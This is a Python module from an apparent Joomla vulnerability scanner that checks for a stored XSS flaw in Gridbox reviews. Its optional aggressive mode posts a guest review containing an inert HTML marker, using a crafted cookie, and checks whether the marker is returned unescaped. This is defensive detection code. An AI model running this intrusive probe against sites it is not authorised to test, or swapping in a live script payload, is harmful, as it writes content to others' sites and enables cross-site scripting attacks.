from __future__ import annotations

import json
import re
from typing import Any

from ...core.http import HttpClient, form_encode, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from . import gridbox_common as gb

CVE_ID = "CVE-2026-107903"
NAME = "Gridbox stored XSS in reviews via inconsistent sanitisation"
COMPONENT = "Gridbox (com_gridbox)"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = "Gridbox 1.0.0 through 2.20.4.2"
FIXED_RULE = "Gridbox 2.20.5.0 or later"
REVIEW_PATH = "/index.php?option=com_gridbox&task=reviews.sendCommentMesssage"
RECENT_REVIEWS = "/index.php?option=com_gridbox&task=editor.getRecentReviews&id=0&maximum=200"
REVIEW_BY_ID = "/index.php?option=com_gridbox&task=reviews.getReviewById&id={review_id}&page={page_id}"


def _guest_cookie(marker: str) -> str:
    value = {
        "name": "GB XSS",
        "email": f"{marker}@example.test",
        "avatar": "",
        "id": 0,
        "type": "guest",
    }
    return "gridbox-comments-user=" + json.dumps(value, separators=(",", ":"))


def _review_id_from_widget(body: str, marker: str) -> str | None:
    index = body.find(marker)
    if index == -1:
        return None
    ids = list(re.finditer(r"(?:review|comment)ID-(\d+)", body[:index]))
    return ids[-1].group(1) if ids else None


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    page_id: str = "900001",
) -> Finding:
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    preflight = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(
            cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True, proof_url=f"{base}/",
            detail=f"The target could not be reached ({transport_error_detail(preflight)}).",
            action="Retry when the target is reachable.",
        )
    marker = "gbxssr" + gb.random_suffix()
    payload = f'<b data-gb-xss="{marker}">r</b>'
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": _guest_cookie(marker),
    }
    client.request(
        f"{base}{REVIEW_PATH}", method="POST", headers=headers,
        data=form_encode({
            "page_id": page_id, "parent": "0", "message": payload,
            "type": "new", "rating": "5", "attachments": "{}", "queue": "{}",
        }),
        timeout=timeout, follow_redirects=False,
    )
    widget = client.get(f"{base}{RECENT_REVIEWS}", timeout=timeout)
    review_id = _review_id_from_widget(widget.get("body", "") or "", marker)
    raw_in_widget = f'data-gb-xss="{marker}"' in (widget.get("body", "") or "")
    comment_message = ""
    raw_in_review = False
    review_status = None
    if review_id:
        one = client.get(
            f"{base}{REVIEW_BY_ID.format(review_id=review_id, page_id=page_id)}", timeout=timeout,
        )
        review_status = one.get("status")
        body = one.get("body", "") or ""
        try:
            parsed = json.loads(body)
            comment_message = str(parsed.get("comment") or "") + str(parsed.get("commentMessage") or "")
        except (ValueError, TypeError):
            comment_message = body
        raw_in_review = f'data-gb-xss="{marker}"' in comment_message
    evidence: dict[str, object] = {
        "marker": marker,
        "page_id": page_id,
        "review_status": review_status,
        "review_id": review_id,
        "raw_in_widget": raw_in_widget,
        "raw_in_getReviewById": raw_in_review,
    }
    if raw_in_review:
        return Finding(
            cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{REVIEW_BY_ID.format(review_id=review_id, page_id=page_id)}",
            evidence=evidence,
            detail=(
                "A guest review carrying an inert HTML marker was stored without sanitisation and "
                "returned raw in getReviewById's individual review output (the comment field). "
                "The probe checks only the unescaped marker tag; no script is executed."
            ),
            action=(
                "Upgrade Gridbox to 2.20.5.0 or later (strip_tags on getReviewById) and review "
                "stored reviews and replies for injected markup."
            ),
        )
    return Finding(
        cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
        component=COMPONENT, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT, exploit_ran=True,
        proof_url=f"{base}{RECENT_REVIEWS}",
        evidence=evidence,
        detail=(
            "The stored review marker was not returned raw by getReviewById "
            f"(review_id={review_id}, raw_in_review={raw_in_review})."
        ),
        action="Verify Gridbox runs 2.20.5.0 or later.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    plugins: dict | None = None,
    **kwargs: Any,
) -> Finding:
    result = gb.passive_gridbox(
        plugins,
        cve=CVE_ID, name=NAME, component=COMPONENT, affected_rule=AFFECTED_RULE,
        fixed_rule=FIXED_RULE, fixed="2.20.5.0",
        affected_detail="Gridbox is in the affected range; verify getReviewById returns review markup raw.",
        patched_detail="Gridbox applies strip_tags to reviews and replies in getReviewById.",
        action="Upgrade Gridbox to 2.20.5.0 or later and review stored reviews/replies.",
    )
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires an aggressive lab-only stored-XSS proof."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    args = aggressive_args or {}
    probe = run_aggressive_probe(
        target_url, timeout=timeout, proxy=proxy,
        page_id=str(args.get("page_id") or "900001"),
    )
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT,
        "affected_rule": AFFECTED_RULE, "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE,
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "module_version": "1.0.0", "last_reviewed": "2026-11-11", "updated": "2026-11-11",
        "required_detectors": ["gridbox"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-107903",
            "https://mysites.guru/blog/gridbox-2-20-5-0-security-fixes/",
        ],
    }
